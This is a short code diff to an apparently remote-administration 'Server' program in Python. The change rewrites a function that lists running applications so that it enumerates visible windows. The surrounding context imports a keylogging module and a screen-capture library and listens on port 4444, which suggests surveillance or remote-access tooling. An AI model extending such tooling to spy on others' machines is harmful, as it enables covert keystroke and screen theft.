@@ -18,6 +18,8 @@ import Keylog
 from tkinter import *
 import signal
 from PIL import ImageGrab
+import win32gui
+import win32process
 
 # HOST = '192.168.1.3'
 PORT = 4444 #Server Port is listening
@@ -351,18 +353,21 @@ class Server:
 
     def view_apps(self):
         try:
-            processes = psutil.process_iter(attrs=['pid', 'name', 'num_threads', 'num_handles'])
+            processes = psutil.process_iter(attrs=['pid', 'name', 'num_threads'])
             app_list = []
-            for process in processes:
-                pid = process.info['pid']
-                name = process.info['name']
-                num_threads = process.info['num_threads']
-                num_handles = process.info['num_handles']
-                if process.info['num_handles'] > 0:
-                    app_list.append(f"{name}\t{pid}\t{num_threads}")
-            return '\n'.join(app_list)
 
-            #return '\n'.join(app_info_list)
+            def enum_windows_callback(hwnd, _):
+                if win32gui.IsWindowVisible(hwnd):
+                    _, pid = win32process.GetWindowThreadProcessId(hwnd)
+                    try:
+                        p = psutil.Process(pid)
+                        app_list.append(f"{p.name()}\t{pid}\t{p.num_threads()}")
+                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                        pass
+
+            win32gui.EnumWindows(enum_windows_callback, None)
+
+            return '\n'.join(app_list)
         except Exception as e:
             return f"Error viewing apps: {e}"
     
